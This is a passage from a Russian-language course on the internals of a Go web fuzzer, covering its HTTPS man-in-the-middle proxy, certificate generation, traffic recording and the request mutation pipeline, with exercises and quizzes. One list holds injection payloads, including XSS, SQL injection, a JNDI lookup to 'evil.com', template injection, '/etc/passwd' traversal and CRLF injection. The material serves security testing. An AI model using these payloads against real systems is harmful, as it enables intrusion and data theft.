    clientConn, _, _ := hj.Hijack()

    // 2. Подтверждаем CONNECT
    clientConn.Write([]byte("HTTP/1.1 200 Connection established\r\n\r\n"))

    // 3. Запускаем MITM в горутине
    go p.mitmHTTPS(clientConn, host, reqID)
}

func (p *Proxy) mitmHTTPS(clientConn net.Conn, host, reqID string) {
    defer clientConn.Close()

    // 1. Получаем сертификат для хоста
    leaf, err := p.cfg.CertStore.GetCertFor(host)

    // 2. Настраиваем TLS
    tlsCfg := p.cfg.CertStore.TLSConfigForClient(leaf)
    tlsConn := tls.Server(clientConn, tlsCfg)

    // 3. TLS handshake
    if err := tlsConn.Handshake(); err != nil {
        metrics.ConnectErrors.WithLabelValues("tls_handshake").Inc()
        return
    }

    // 4. Создаём HTTP-сервер поверх TLS-соединения
    srv := &http.Server{
        Handler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            r.URL.Scheme = "https"
            r.URL.Host = host
            p.handleHTTP(w, r)  // Рекурсивно вызываем handleHTTP
        }),
    }

    // 5. Обслуживаем одно соединение
    ln := newSingleConnListener(tlsConn)
    srv.Serve(ln)
}
```

### Хранилище сертификатов: internal/store/store.go

```go
type CertStore struct {
    dir        string                           // Директория для хранения
    memOnly    bool                             // Только в памяти
    root       *tls.Certificate                 // Root CA
    cache      *lru.Cache[string, *tls.Certificate] // LRU-кэш
    sfGroup    singleflight.Group               // Предотвращение дублирования
    mu         sync.Mutex
}

// GetCertFor — получает сертификат из кэша или генерирует новый
func (c *CertStore) GetCertFor(host string) (tls.Certificate, error) {
    c.mu.Lock()
    if cert, ok := c.cache.Get(host); ok {
        metrics.CertCacheHits.Inc()
        c.mu.Unlock()
        return *cert, nil
    }
    c.mu.Unlock()

    // singleflight: только один запрос на генерацию для хоста
    result, err, _ := c.sfGroup.Do(host, func() (any, error) {
        metrics.CertCacheMisses.Inc()

        // Retry logic (3 попытки)
        for attempt := 0; attempt < 3; attempt++ {
            cert, err := c.generateLeaf(host)
            if err == nil {
                c.cache.Add(host, &cert)
                return cert, nil
            }
            time.Sleep(10 * time.Millisecond)
        }
        return nil, fmt.Errorf("failed after retries")
    })

    return result.(tls.Certificate), err
}
```

### TeeReadCloser и LimitedBuffer: internal/httputil/http.go

```go
// TeeReadCloser читает из Reader и одновременно пишет в Writer
// Паттерн: позволяет "подслушивать" поток без потребления
type TeeReadCloser struct {
    r io.Reader
    w io.Writer
}

func (t *TeeReadCloser) Read(p []byte) (n int, err error) {
    n, err = t.r.Read(p)
    if n > 0 {
        t.w.Write(p[:n])  // Копируем прочитанное
    }
    return
}

// LimitedBuffer — буфер с ограничением размера
type LimitedBuffer struct {
    buf       []byte
    maxBytes  int
    truncated bool
}

func (b *LimitedBuffer) Write(p []byte) (n int, err error) {
    if len(b.buf) >= b.maxBytes {
        b.truncated = true
        return len(p), nil  // Игнорируем лишнее
    }
    toWrite := min(len(p), b.maxBytes-len(b.buf))
    b.buf = append(b.buf, p[:toWrite]...)
    if toWrite < len(p) {
        b.truncated = true
    }
    return len(p), nil
}
```

## Ключевые файлы для изучения

| Файл                          | Назначение                   |
| ----------------------------- | ---------------------------- |
| `internal/mitm/mitm.go`       | MITM-прокси                  |
| `internal/store/store.go`     | Управление сертификатами     |
| `internal/httputil/http.go`   | TeeReadCloser, LimitedBuffer |
| `internal/httputil/reqid.go`  | Генерация Request ID         |
| `internal/metrics/metrics.go` | Метрики прокси               |

## Практические упражнения

### Упражнение 3.1: Настройка прокси

**Задача:** Настройте браузер для работы через FFUUZZ-прокси.

```bash
# 1. Запустите FFUUZZ
./ffuuzz serve

# 2. Настройте браузер (Chrome)
# Settings → Proxy → Manual proxy configuration
# HTTP Proxy: localhost, Port: 8080
# HTTPS Proxy: localhost, Port: 8080

# 3. Установите Root CA
# Откройте http://localhost:8081/ui/ → скачайте CA
# Импортируйте в систему/браузер

# 4. Проверьте
 curl -x http://localhost:8080 -k https://example.com
```

### Упражнение 3.2: Исследование сертификатов

**Задача:** Изучите сгенерированные сертификаты.

```bash
# 1. Найдите Root CA
ls certs/
# ca.pem ca.key

# 2. Посмотрите информацию
openssl x509 -in certs/ca.pem -text -noout

# 3. После посещения сайтов через прокси
ls certs/
# ca.pem ca.key example.com.pem example.com.key

# 4. Проверьте leaf-сертификат
openssl x509 -in certs/example.com.pem -text -noout | grep "Subject Alternative Name" -A1
```

### Упражнение 3.3 (Challenge): Hop-by-hop заголовки

**Задача:** Найдите в коде, какие заголовки удаляются как hop-by-hop, и объясните почему.

```go
// В internal/httputil/http.go найдите:
func RemoveHopByHop(header http.Header) {
    // ...
}
```

**Подсказка:** См. RFC 2616, раздел 13.5.1.

## Типичные ошибки и заблуждения

| Ошибка                       | Почему это проблема                                 | Как исправить                                |
| ---------------------------- | --------------------------------------------------- | -------------------------------------------- |
| Не установить Root CA        | Браузер будет показывать ERR_CERT_AUTHORITY_INVALID | Установите CA в доверенные                   |
| Игнорировать `singleflight`  | Конкурентная генерация сертификатов                 | Используйте `golang.org/x/sync/singleflight` |
| Не ограничивать размер тела  | OOM при больших ответах                             | Используйте `LimitedBuffer`                  |
| Забывать про `hijack` ошибки | Утечка соединений                                   | Всегда обрабатывайте ошибки hijack           |

## Проверка знаний

1. **Вопрос:** Какой метод HTTP используется для установления HTTPS-туннеля?
   - A) GET
   - B) POST
   - C) CONNECT
   - D) PROXY

2. **Вопрос:** Зачем нужен `singleflight.Group` в CertStore?
   - A) Для кэширования
   - B) Чтобы не генерировать сертификаты параллельно для одного хоста
   - C) Для шифрования
   - D) Для подписи

3. **Вопрос:** Что делает `TeeReadCloser`?
   - A) Шифрует данные
   - B) Читает и одновременно копирует в другой writer
   - C) Сжимает данные
   - D) Проверяет целостность

4. **Вопрос (что будет, если...):** Что произойдёт, если LRU-кэш сертификатов переполнится?
   - A) Система упадёт
   - B) Самый старый сертификат будет вытеснен
   - C) Новые сертификаты не будут кэшироваться
   - D) Будет ошибка

5. **Вопрос:** Какой порт использует MITM-прокси по умолчанию?
   - A) 80
   - B) 443
   - C) 8080
   - D) 8081

**Ответы:** 1-C, 2-B, 3-B, 4-B, 5-C

## Резюме и следующие шаги

В этом модуле мы:

- Изучили разницу между HTTP и HTTPS-проксированием
- Разобрали механизм MITM и протокол CONNECT
- Поняли управление TLS-сертификатами и LRU-кэширование
- Освоили паттерны TeeReadCloser и LimitedBuffer

**Следующий модуль:** Запись и нормализация трафика — изучим, как записи группируются по endpoint и нормализуются пути.

---

# Модуль 4: Запись и нормализация трафика

## Обзор

Этот модуль посвящён системе записи трафика и интеллектуальной группировке запросов. Мы разберём два режима записи, конвертацию форматов и алгоритмы нормализации endpoint.

## Цели обучения

- Понять разницу между JSONLRecorder и DBRecorder
- Изучить конвертацию TxRecord ↔ Exchange
- Разобраться в эвристической нормализации путей
- Освоить статистическое схлопывание через trie
- Понять двухфазный процесс нормализации

## Основные концепции

### Два режима записи

**Аналогия:** Представьте два способа ведения дневника:

- **JSONLRecorder** = Простой блокнот (письменно, один файл, быстро)
- **DBRecorder** = Организованная картотека (группировка, поиск, сложнее)

| Режим         | Команда | Хранилище   | Группировка | Использование      |
| ------------- | ------- | ----------- | ----------- | ------------------ |
| JSONLRecorder | `proxy` | Файл .jsonl | Нет         | Dev-режим, отладка |
| DBRecorder    | `serve` | PostgreSQL  | По endpoint | Production         |

### Двухфазная нормализация

```
Исходный путь: /api/users/550e8400-e29b-41d4-a716-446655440000/orders/123

Фаза 1: Эвристическая нормализация (immediate)
  ┌────────────────────────────────────────────────────────────────┐
  │  UUID → {_}    /api/users/{_}/orders/123                       │
  │  Числа → {_}   /api/users/{_}/orders/{_}                       │
  └────────────────────────────────────────────────────────────────┘

Фаза 2: Статистическое схлопывание (async)
  ┌────────────────────────────────────────────────────────────────┐
  │  Если видим много разных значений в сегменте:                  │
  │  /api/products/shoes                                           │
  │  /api/products/hats                                            │
  │  /api/products/bags  ──────▶  /api/products/{_}                │
  └────────────────────────────────────────────────────────────────┘
```

### Trie-структура для статистического схлопывания

```
До схлопывания:

        root
          │
          ▼
        api
       /   \
    users  products
     │      /    \
    {_}   shoes  hats
           │      │
          ...    ...

После схлопывания (при пороге > 3 уникальных значения):

        root
          │
          ▼
        api
       /   \
    users  products
     │         \
    {_}         {_}
```

## Практический разбор кода

### Recorder-интерфейс: internal/recorder/recorder.go

```go
// Recorder — общий интерфейс для записи
type Recorder interface {
    Record(tx *TxRecord) error
    Close() error
}

// TxRecord — JSONL-представление транзакции
type TxRecord struct {
    RequestID   string              // YYYYMMDD-UUIDv4
    Time        time.Time
    Method      string
    URL         string              // Полный URL
    ReqHeaders  map[string][]string
    ReqBody     string              // base64
    ReqTrunc    bool
    RespStatus  int
    RespHeaders map[string][]string
    RespBody    string              // base64
    RespTrunc   bool
    Timings     map[string]int64
}
```

### JSONLRecorder

```go
type jsonl struct {
    f     *os.File
    mu    sync.Mutex
    fsync bool
}

func (j *jsonl) Record(tx *TxRecord) error {
    j.mu.Lock()
    defer j.mu.Unlock()

    b, _ := json.Marshal(tx)
    b = append(b, '\n')  // JSON Lines формат

    j.f.Write(b)
    return nil
}
```

### DBRecorder с нормализацией

```go
type DBRecorder struct {
    store    RecordingInserter
    resolver *endpoint.Resolver  // Для статистического схлопывания
    logger   zerolog.Logger
    mu       sync.Mutex
}

func (d *DBRecorder) Record(tx *TxRecord) error {
    // 1. Парсим URL
    u, _ := url.Parse(tx.URL)

    // 2. Извлекаем компоненты
    scheme := u.Scheme  // "https"
    host := u.Hostname() // "example.com"
    port, _ := strconv.Atoi(u.Port()) // 443
    path := u.Path      // "/api/users/123"

    // 3. Фаза 1: Эвристическая нормализация
    path = endpoint.NormalizePath(path)
    // Результат: "/api/users/{_}"

    // 4. Фаза 2: Статистическая нормализация
    origin := endpoint.Origin{Scheme: scheme, Host: host, Port: port}
    if d.resolver != nil {
        path = d.resolver.ObservePath(origin, path)
    }

    // 5. Создаём сессию
    sess := model.RecordingSession{
        SchemaVersion: 1,
        CreatedAt:     tx.Time,
        Target: model.TargetInfo{
            Scheme: scheme,
            Host:   host,
            Port:   port,
            Path:   path,
        },
        Entries: []model.Exchange{TxRecordToExchange(*tx)},
    }

    // 6. Идемпотентная вставка
    d.store.FindOrAppend(ctx, sess)
}
```

### Эвристическая нормализация: internal/endpoint/normalize.go

```go
// NormalizePath заменяет параметрические сегменты на {_}
func NormalizePath(path string) string {
    segments := strings.Split(path, "/")
    for i, seg := range segments {
        if isParameter(seg) {
            segments[i] = Placeholder  // "{_}"
        }
    }
    return strings.Join(segments, "/")
}

func isParameter(seg string) bool {
    // 1. Чисто числовой ID
    if numericRe.MatchString(seg) {
        return true  // "123" → {_}
    }

    // 2. UUID
    if uuidRe.MatchString(seg) {
        return true  // "550e8400-..." → {_}
    }

    // 3. Hex-хеш ≥ 8 символов
    if hexRe.MatchString(seg) {
        return true  // "a1b2c3d4" → {_}
    }

    // 4. Content-hashed файл
    if hashedFileRe.MatchString(seg) {
        return true  // "app.a1b2c3d4.js" → {_}
    }

    // 5. Высокоэнтропийный токен
    if tokenCharRe.MatchString(seg) && hasMixedClasses(seg) {
        return true  // "eyJhbGciOiJIUzI1NiJ9" → {_}
    }

    return false
}
```

### Trie для статистического схлопывания: internal/endpoint/trie.go

```go
// trieNode — узел префиксного дерева
type trieNode struct {
    children         map[string]*trieNode
    observationCount int  // Сколько записей прошло через узел
}

// observe — добавляет путь в trie
func (n *trieNode) observe(segments []string) {
    cur := n
    for _, seg := range segments {
        cur.observationCount++
        child, ok := cur.children[seg]
        if !ok {
            child = newTrieNode()
            cur.children[seg] = child
        }
        cur = child
    }
    cur.observationCount++
}

// shouldCollapse — проверяет условия схлопывания
func shouldCollapse(literalCount, observationCount int, hasPlaceholder bool) bool {
    // Условие A: Чисто статистическое
    // Если уникальных значений > 30% от всех наблюдений
    if literalCount >= 3 && observationCount > 0 {
        ratio := float64(literalCount) / float64(observationCount)
        if ratio > 0.3 {
            return true
        }
    }

    // Условие B: Эвристика уже нашла параметр
    // Если есть {_} и ≥2 других значений — схлопываем
    if hasPlaceholder && literalCount >= 2 {
        return true
    }

    return false
}
```

### Конвертация форматов

```go
// TxRecordToExchange — из JSONL в доменную модель
func TxRecordToExchange(tx TxRecord) model.Exchange {
    u, _ := url.Parse(tx.URL)

    return model.Exchange{
        RequestID:  tx.RequestID,
        StartedAt:  tx.Time,
        DurationMs: tx.Timings["total_ms"],
        Request: model.RequestData{
            Method:  tx.Method,
            Path:    u.Path,
            Query:   u.RawQuery,
            Headers: tx.ReqHeaders,
            BodyB64: tx.ReqBody,
        },
        Response: model.ResponseData{
            Status:  tx.RespStatus,
            Headers: tx.RespHeaders,
            BodyB64: tx.RespBody,
        },
    }
}

// ExchangeToTxRecord — из доменной модели в JSONL
func ExchangeToTxRecord(ex model.Exchange, baseURL string) TxRecord {
    fullURL := baseURL + ex.Request.Path
    if ex.Request.Query != "" {
        fullURL += "?" + ex.Request.Query
    }

    return TxRecord{
        RequestID:   ex.RequestID,
        Time:        ex.StartedAt,
        Method:      ex.Request.Method,
        URL:         fullURL,
        ReqHeaders:  ex.Request.Headers,
        ReqBody:     ex.Request.BodyB64,
        RespStatus:  ex.Response.Status,
        RespHeaders: ex.Response.Headers,
        RespBody:    ex.Response.BodyB64,
    }
}
```

## Ключевые файлы для изучения

| Файл                             | Назначение                           |
| -------------------------------- | ------------------------------------ |
| `internal/recorder/recorder.go`  | Recorder-интерфейс и конвертеры      |
| `internal/endpoint/normalize.go` | Эвристическая нормализация           |
| `internal/endpoint/trie.go`      | Trie для статистического схлопывания |
| `internal/endpoint/resolver.go`  | Resolver с async merge               |
| `internal/db/recordings.go`      | Store с FindOrAppend                 |

## Практические упражнения

### Упражнение 4.1: Нормализация путей

**Задача:** Примените `NormalizePath` к разным URL.

```go
package main

import (
    "fmt"
    "ffuuzz/internal/endpoint"
)

func main() {
    paths := []string{
        "/api/users/123",
        "/api/users/550e8400-e29b-41d4-a716-446655440000",
        "/assets/app.a1b2c3d4.js",
        "/items/deadbeef12345678",
        "/static/style.css",
    }

    for _, p := range paths {
        normalized := endpoint.NormalizePath(p)
        fmt.Printf("%s → %s\n", p, normalized)
    }
}
```

**Ожидаемый результат:**

```
/api/users/123 → /api/users/{_}
/api/users/550e8400-e29b-41d4-a716-446655440000 → /api/users/{_}
/assets/app.a1b2c3d4.js → /assets/{_}
/items/deadbeef12345678 → /items/{_}
/static/style.css → /static/style.css
```

### Упражнение 4.2: Импорт JSONL

**Задача:** Запишите трафик в JSONL и импортируйте в БД.

```bash
# 1. Запишите трафик в JSONL
./ffuuzz proxy -output traffic.jsonl

# 2. В другом терминале отправьте запросы
curl -x http://localhost:8080 http://httpbin.org/get

# 3. Остановите прокси (Ctrl+C)

# 4. Проанализируйте
./ffuuzz record < traffic.jsonl

# 5. Импортируйте через API
curl -X POST http://localhost:8081/api/v1/recordings/import \
  -H "Content-Type: application/json" \
  -d @traffic.jsonl
```

### Упражнение 4.3 (Challenge): Новый паттерн нормализации

**Задача:** Добавьте распознавание email-адресов в путях.

```go
// В internal/endpoint/normalize.go добавьте:
var emailRe = regexp.MustCompile(`^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$`)

func isParameter(seg string) bool {
    // ... существующие проверки ...

    // 6. Email-адрес
    if emailRe.MatchString(seg) {
        return true
    }

    return false
}
```

**Тест:** `/api/users/john@example.com` → `/api/users/{_}`

## Типичные ошибки и заблуждения

| Ошибка                           | Почему это проблема                | Как исправить                            |
| -------------------------------- | ---------------------------------- | ---------------------------------------- |
| Слишком агрессивная нормализация | Потеря семантики endpoint          | Тщательно настраивайте regex             |
| Игнорировать query-параметры     | Разные ресурсы группируются вместе | Нормализуйте и query                     |
| Не использовать mutex в recorder | Race condition                     | Используйте `sync.Mutex`                 |
| Забывать про `FindOrAppend`      | Дублирование записей               | Всегда используйте идемпотентную вставку |

## Проверка знаний

1. **Вопрос:** Какой Recorder используется в production-режиме?
   - A) JSONLRecorder
   - B) DBRecorder
   - C) FileRecorder
   - D) MemoryRecorder

2. **Вопрос:** Что делает `NormalizePath` с UUID?
   - A) Удаляет
   - B) Заменяет на `{_}`
   - C) Оставляет как есть
   - D) Хеширует

3. **Вопрос:** Какая структура данных используется для статистического схлопывания?
   - A) Hash map
   - B) Trie (префиксное дерево)
   - C) B-tree
   - D) Graph

4. **Вопрос (что будет, если...):** Что произойдёт, если `/api/products/shoes` и `/api/products/hats` попадут в trie при пороге 2?
   - A) Ничего
   - B) Схлопнутся в `/api/products/{_}`
   - C) Останутся раздельно
   - D) Будет ошибка

5. **Вопрос:** Какой метод store обеспечивает идемпотентность?
   - A) Create
   - B) Insert
   - C) FindOrAppend
   - D) Upsert

**Ответы:** 1-B, 2-B, 3-B, 4-B, 5-C

## Резюме и следующие шаги

В этом модуле мы:

- Изучили два режима записи (JSONL и DB)
- Разобрали двухфазную нормализацию путей
- Освоили trie-структуру для статистического схлопывания
- Поняли конвертацию между форматами

**Следующий модуль:** Система мутаций — изучим все типы мутаций и pipeline-паттерн.

---

# Модуль 5: Система мутаций

## Обзор

Этот модуль посвящён "мозгу" фаззинга — системе мутаций. Мы разберём все типы мутаций, pipeline-паттерн и контроль воспроизводимости.

## Цели обучения

- Понять pipeline-паттерн для композиции мутаторов
- Изучить все типы мутаций (URI, headers, JSON, params, sequence)
- Разобраться в примитивных мутациях (bit flip, block ops)
- Освоить контроль интенсивности и воспроизводимость
- Понять ограничения размеров

## Основные концепции

### Pipeline-паттерн

**Аналогия:** Конвейер на фабрике:

1. Заготовка входит
2. Операция 1 (с вероятностью 50%)
3. Операция 2 (с вероятностью 50%)
4. ...
5. Если ничего не применилось — fallback-операция
6. Готовое изделие

```
┌─────────────────────────────────────────────────────────────────┐
│                    Mutation Pipeline                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Input Exchange                                                 │
│       │                                                         │
│       ▼                                                         │
│  ┌─────────────┐  intensity=0.5                                 │
│  │ URIMutator  │◀── rng.Float64() < 0.5 ?                       │
│  └──────┬──────┘                                                │
│         │                                                       │
│         ▼                                                       │
│  ┌─────────────┐  intensity=0.5                                 │
│  │HeaderMutator│◀── rng.Float64() < 0.5 ?                       │
│  └──────┬──────┘                                                │
│         │                                                       │
│         ▼                                                       │
│  ┌─────────────┐  intensity=0.5                                 │
│  │ JSONMutator │◀── rng.Float64() < 0.5 ?                       │
│  └──────┬──────┘                                                │
│         │                                                       │
│         ▼                                                       │
│  ┌─────────────┐  intensity=0.5                                 │
│  │ParamMutator │◀── rng.Float64() < 0.5 ?                       │
│  └──────┬──────┘                                                │
│         │                                                       │
│         ▼                                                       │
│  ┌─────────────────┐  если len(ops) == 0                        │
│  │PrimitiveMutator │  (fallback)                                │
│  └────────┬────────┘                                            │
│           │                                                     │
│           ▼                                                     │
│    ┌──────────────┐                                             │
│    │ enforceSize  │  MaxURLLen, MaxHdrLen, MaxBodyLen           │
│    │    Limits    │                                             │
│    └──────┬───────┘                                             │
│           │                                                     │
│           ▼                                                     │
│    Output Exchange + Operators[]                                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Типы мутаций

| Мутатор          | Что мутирует      | Примеры операций                                                         |
| ---------------- | ----------------- | ------------------------------------------------------------------------ |
| URIMutator       | Path, Query       | Вставка сегментов, query-параметры, reserved chars, percent-encoding     |
| HeaderMutator    | HTTP-заголовки    | Add/remove/duplicate, длинные значения, конфликтующие заголовки          |
| JSONMutator      | JSON body         | Type substitution, object/array mutations, boundary values, depth stress |
| ParamMutator     | Query/Form params | Инъекция fuzz-строк                                                      |
| PrimitiveMutator | Raw bytes         | Bit flip, byte ops, block ops, interesting values, splicing              |
| SeqMutator       | Sequence          | Drop, duplicate, swap exchanges                                          |

## Практический разбор кода

### Pipeline: internal/mutate/mutate.go

```go
// Config — настройки мутаций
type Config struct {
    PathQuery      bool
    Headers        bool
    JSONBody       bool
    Params         bool
    Sequence       bool
    Intensity      float64  // 0.0 - 1.0
    MaxURLLen      int      // 8192
    MaxHdrLen      int      // 8192
    MaxBodyLen     int      // 1MB
    UserDictionary map[string][]string
}

// Pipeline — композиция мутаторов
type Pipeline struct {
    cfg       Config
    primitive *PrimitiveMutator
    uri       *URIMutator
    header    *HeaderMutator
    jsonM     *JSONMutator
    param     *ParamMutator
}

func (p *Pipeline) Mutate(ex model.Exchange, rng *rand.Rand, intensity float64) MutationResult {
    var ops []string
    result := ex

    // Применяем мутаторы с вероятностью intensity
    if p.cfg.PathQuery && rng.Float64() < intensity {
        r := p.uri.Mutate(result, rng, intensity)
        result = r.Exchange
        ops = append(ops, r.Operators...)
    }

    if p.cfg.Headers && rng.Float64() < intensity {
        r := p.header.Mutate(result, rng, intensity)
        result = r.Exchange
        ops = append(ops, r.Operators...)
    }

    if p.cfg.JSONBody && rng.Float64() < intensity {
        r := p.jsonM.Mutate(result, rng, intensity)
        result = r.Exchange
        ops = append(ops, r.Operators...)
    }

    if p.cfg.Params && rng.Float64() < intensity {
        r := p.param.Mutate(result, rng, intensity)
        result = r.Exchange
        ops = append(ops, r.Operators...)
    }

    // Fallback: если ничего не применилось
    if len(ops) == 0 {
        r := p.primitive.Mutate(result, rng, intensity)
        result = r.Exchange
        ops = append(ops, r.Operators...)
    }

    // Применяем ограничения размеров
    result = p.enforceSizeLimits(result)

    return MutationResult{Exchange: result, Operators: ops}
}
```

### URI-мутации: internal/mutate/uri.go

```go
type URIMutator struct {
    MaxURLLen int
}

func (m *URIMutator) Mutate(ex model.Exchange, rng *rand.Rand, intensity float64) MutationResult {
    ops := rng.Intn(6)  // 6 типов операций

    switch ops {
    case 0:
        // uri:path_segment — вставка/удаление/дублирование сегментов
        ex = m.mutatePathSegments(ex, rng)
    case 1:
        // uri:query_param — мутации query-параметров
        ex = m.mutateQueryParams(ex, rng)
    case 2:
        // uri:reserved_inject — инъекция reserved characters
        ex = m.injectReservedChars(ex, rng)
    case 3:
        // uri:percent_encoding — невалидные percent-encoding
        ex = m.injectInvalidEncoding(ex, rng)
    case 4:
        // uri:slash_manipulation — манипуляции со слешами
        ex = m.slashManipulation(ex, rng)
    case 5:
        // uri:long_value — очень длинные значения
        ex = m.longValue(ex, rng)
    }

    return MutationResult{Exchange: ex, Operators: []string{opName}}
}

// Примеры операций:
// /api/users/42 → /api/xKq3w/users/42        (вставка сегмента)
// /api/users/42?page=1 → /api/users/42?page=1&fuzz=AAAA.. (длинный параметр)
// /api/users/42 → /api/users/42#extra        (инъекция #)
// /api/users/42 → /api/users/42/..           (dot-segment)
```

### JSON-мутации: internal/mutate/json.go

```go
type JSONMutator struct {
    MaxBodyLen int
}

func (m *JSONMutator) Mutate(ex model.Exchange, rng *rand.Rand, intensity float64) MutationResult {
    // Проверяем Content-Type
    ct := ex.Request.Headers["Content-Type"]
    if !strings.Contains(ct, "json") {
        // Fallback к примитивам
        return p.Mutate(ex, rng, intensity)
    }

    // Парсим JSON
    bodyBytes, _ := base64.StdEncoding.DecodeString(ex.Request.BodyB64)
    var data interface{}
    json.Unmarshal(bodyBytes, &data)

    op := rng.Intn(6)
    switch op {
    case 0: // json:type_substitute
        data = m.typeSubstitute(data, rng)
        // "value" → 123, true, null, [], {}
    case 1: // json:object_key
        data = m.objectKeyMutation(data, rng)
        // add/remove/duplicate/rename keys
    case 2: // json:array_mutation
        data = m.arrayMutation(data, rng)
        // duplicate/insert/remove/empty
    case 3: // json:boundary_values
        data = m.boundaryValues(data, rng)
        // 0, MaxFloat64, NaN, Inf
    case 4: // json:depth_stress
        data = m.depthStress(data, rng)
        // 20-100 уровней вложенности
    case 5: // json:string_mutation
        data = m.stringMutation(data, rng)
        // XSS, SQLi, JNDI, path traversal...
    }
}

// Fuzz-строки для инъекции
var fuzzStrings = []string{
    "<script>alert(1)</script>",           // XSS
    "' OR '1'='1",                         // SQLi
    "${jndi:ldap://evil.com/a}",           // JNDI
    "{{7*7}}",                             // Template injection
    "../../../etc/passwd",                 // Path traversal
    "\r\nX-Injected: true",                // CRLF injection
}
```

### Примитивные мутации: internal/mutate/primitive.go

```go
type PrimitiveMutator struct{}

func (m *PrimitiveMutator) Mutate(ex model.Exchange, rng *rand.Rand, intensity float64) MutationResult {
    bodyBytes, _ := base64.StdEncoding.DecodeString(ex.Request.BodyB64)

    op := rng.Intn(6)
    switch op {
    case 0: // bit_flip
        idx := rng.Intn(len(bodyBytes))
        bit := uint(rng.Intn(8))
        bodyBytes[idx] ^= (1 << bit)

    case 1: // byte_flip
        idx := rng.Intn(len(bodyBytes))
        bodyBytes[idx] = ^bodyBytes[idx]

    case 2: // arithmetic_add
        idx := rng.Intn(len(bodyBytes))
        delta := rng.Intn(35) + 1
        bodyBytes[idx] = byte(int(bodyBytes[idx]) + delta)

    case 3: // interesting_replace
        interesting := []byte{0x00, 0xFF, 0x7F, 0x80, 0x20}
        idx := rng.Intn(len(bodyBytes))
        bodyBytes[idx] = interesting[rng.Intn(len(interesting))]

    case 4: // block_insert
        idx := rng.Intn(len(bodyBytes) + 1)
        block := make([]byte, rng.Intn(32)+1)
        rng.Read(block)
        bodyBytes = append(bodyBytes[:idx], append(block, bodyBytes[idx:]...)...)

    case 5: // splice
        // Склейка с другой частью тела
    }

    ex.Request.BodyB64 = base64.StdEncoding.EncodeToString(bodyBytes)
    return MutationResult{Exchange: ex, Operators: []string{"primitive:" + opName}}
}
```

### Sequence-мутации: internal/mutate/sequence.go

```go
type SeqMutator struct{}

func (m *SeqMutator) Mutate(exs []model.Exchange, rng *rand.Rand, intensity float64) SequenceMutationResult {
    if len(exs) <= 1 {
        return SequenceMutationResult{Exchanges: exs}
    }

    op := rng.Intn(4)
    switch op {
    case 0: // sequence:drop
        // Удаляем случайный exchange (кроме первого)
        idx := rng.Intn(len(exs)-1) + 1
        exs = append(exs[:idx], exs[idx+1:]...)

    case 1: // sequence:duplicate
        // Дублируем exchange
        idx := rng.Intn(len(exs))
        exs = append(exs, exs[idx])

    case 2: // sequence:swap
        // Меняем местами соседние
        idx := rng.Intn(len(exs) - 1)
        exs[idx], exs[idx+1] = exs[idx+1], exs[idx]

    case 3: // sequence:per_step
        // Применяем примитив к одному exchange
        idx := rng.Intn(len(exs))
        p := &PrimitiveMutator{}
        r := p.Mutate(exs[idx], rng, intensity)
        exs[idx] = r.Exchange
    }

    return SequenceMutationResult{Exchanges: exs, Operators: []string{opName}}
}
```

## Ключевые файлы для изучения

| Файл                           | Назначение              |
| ------------------------------ | ----------------------- |
| `internal/mutate/mutate.go`    | Pipeline и конфигурация |
| `internal/mutate/uri.go`       | URI-мутации             |
| `internal/mutate/header.go`    | Header-мутации          |
| `internal/mutate/json.go`      | JSON-мутации            |
| `internal/mutate/param.go`     | Param-мутации           |
| `internal/mutate/primitive.go` | Примитивные мутации     |
| `internal/mutate/sequence.go`  | Sequence-мутации        |

## Практические упражнения

### Упражнение 5.1: Исследование мутаций

**Задача:** Напишите тест, который применяет каждый мутатор к фиксированному exchange.

```go
func TestMutators(t *testing.T) {
    ex := model.Exchange{
        Request: model.RequestData{
            Method: "POST",
            Path:   "/api/users",
            Query:  "page=1",
            Headers: map[string][]string{
                "Content-Type": {"application/json"},
            },
            BodyB64: base64.StdEncoding.EncodeToString([]byte(`{"name":"test"}`)),
        },
    }

    rng := rand.New(rand.NewSource(42))

    mutators := []struct {
        name string
        m    mutate.ExchangeMutator
    }{
        {"URI", &mutate.URIMutator{MaxURLLen: 8192}},
        {"Header", &mutate.HeaderMutator{MaxHdrLen: 8192}},
        {"JSON", &mutate.JSONMutator{MaxBodyLen: 1 << 20}},
    }

    for _, tc := range mutators {
        t.Run(tc.name, func(t *testing.T) {
            result := tc.m.Mutate(ex, rng, 1.0)
            t.Logf("Operators: %v", result.Operators)
            t.Logf("Path: %s", result.Exchange.Request.Path)
        })
    }
}
```

### Упражнение 5.2: Воспроизводимость

**Задача:** Проверьте, что мутации воспроизводимы с одним seed.

```go
func TestReproducibility(t *testing.T) {
    ex := createTestExchange()
    seed := int64(12345)

    // Первая мутация
    rng1 := rand.New(rand.NewSource(seed))
    p := mutate.NewPipeline(mutate.DefaultConfig())
    result1 := p.Mutate(ex, rng1, 0.5)

    // Вторая мутация с тем же seed
    rng2 := rand.New(rand.NewSource(seed))
    result2 := p.Mutate(ex, rng2, 0.5)

    // Должны быть идентичны
    if !reflect.DeepEqual(result1, result2) {
        t.Error("Mutations not reproducible!")
    }
}
```

### Упражнение 5.3 (Challenge): Новый мутатор

**Задача:** Создайте мутатор, который добавляет случайные Unicode-символы в строковые значения JSON.

```go
type UnicodeMutator struct{}

func (m *UnicodeMutator) Mutate(ex model.Exchange, rng *rand.Rand, intensity float64) mutate.MutationResult {
    // Реализация...
}
```

## Типичные ошибки и заблуждения

| Ошибка                   | Почему это проблема                            | Как исправить                        |
| ------------------------ | ---------------------------------------------- | ------------------------------------ |
| Intensity = 1.0 всегда   | Слишком агрессивные мутации, нет вариативности | Используйте 0.3-0.7                  |
| Игнорировать size limits | OOM на больших телах                           | Всегда вызывайте `enforceSizeLimits` |
| Не сохранять seed        | Невозможно воспроизвести находку               | Сохраняйте `MutationSeed` в артефакт |
| Мутировать без копии     | Race condition                                 | Используйте `deepCopyExchange`       |

## Проверка знаний

1. **Вопрос:** Что происходит, если ни один мутатор в pipeline не сработал?
   - A) Возвращается оригинал
   - B) Применяется PrimitiveMutator
   - C) Ошибка
   - D) Повторная попытка

2. **Вопрос:** Какой мутатор отвечает за изменение порядка exchange в сессии?
   - A) URIMutator
   - B) SeqMutator
   - C) JSONMutator
   - D) HeaderMutator

3. **Вопрос:** Что такое "intensity" в конфигурации мутаций?
   - A) Количество воркеров
   - B) Вероятность применения каждого мутатора
   - C) Скорость фаззинга
